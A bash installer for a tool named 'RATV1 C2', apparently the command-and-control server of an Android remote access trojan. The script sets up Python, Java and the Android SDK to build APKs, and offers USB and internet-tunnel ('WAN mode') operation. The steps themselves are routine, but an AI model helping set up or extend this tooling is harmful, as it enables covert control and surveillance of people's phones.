#!/bin/bash
set -e
echo ""
echo " +--------------------------------------------------+"
echo " |  RATV1 C2 -- SETUP                            |"
echo " +--------------------------------------------------+"
echo ""

# Python check
if ! command -v python3 &>/dev/null; then
    echo " [!] python3 not found. Install Python 3.10+"
    echo "     Ubuntu/Debian: sudo apt install python3 python3-venv python3-pip"
    echo "     macOS: brew install python3"
    exit 1
fi
PYVER=$(python3 --version 2>&1)
echo " [+] $PYVER"

# venv
if [ ! -d "venv" ]; then
    echo " [.] Creating venv..."
    python3 -m venv venv
fi
echo " [+] venv ready"

# pip install
echo " [.] Installing requirements..."
venv/bin/python -m pip install --upgrade pip -q
venv/bin/python -m pip install -r requirements.txt -q
echo " [+] Requirements installed"

# Java check
if command -v java &>/dev/null; then
    JAVAVER=$(java -version 2>&1 | head -1)
    echo " [+] $JAVAVER"
else
    echo " [~] Java not found -- needed to build APKs"
    echo "     Ubuntu: sudo apt install openjdk-17-jdk"
    echo "     macOS:  brew install openjdk@17"
fi

# ADB check
if command -v adb &>/dev/null; then
    echo " [+] ADB available"
else
    echo " [~] ADB not found -- needed for USB tunnel mode"
    echo "     Ubuntu: sudo apt install adb"
    echo "     macOS:  brew install android-platform-tools"
fi

# Android SDK
if [ ! -d "android-sdk" ]; then
    echo " [.] Android SDK not found -- running sdk setup..."
    venv/bin/python setup.py
else
    echo " [+] Android SDK found"
fi

echo ""
echo " +--------------------------------------------------+"
echo " |  SETUP COMPLETE                                  |"
echo " |                                                  |"
echo " |  ADB mode (USB):                                 |"
echo " |    ./start.sh                                    |"
echo " |                                                  |"
echo " |  WAN mode (any network):                         |"
echo " |    venv/bin/python wan.py --setup-playit         |"
echo " |    venv/bin/python wan.py --mode playit          |"
echo " |    ./start.sh                                    |"
echo " +--------------------------------------------------+"
echo ""
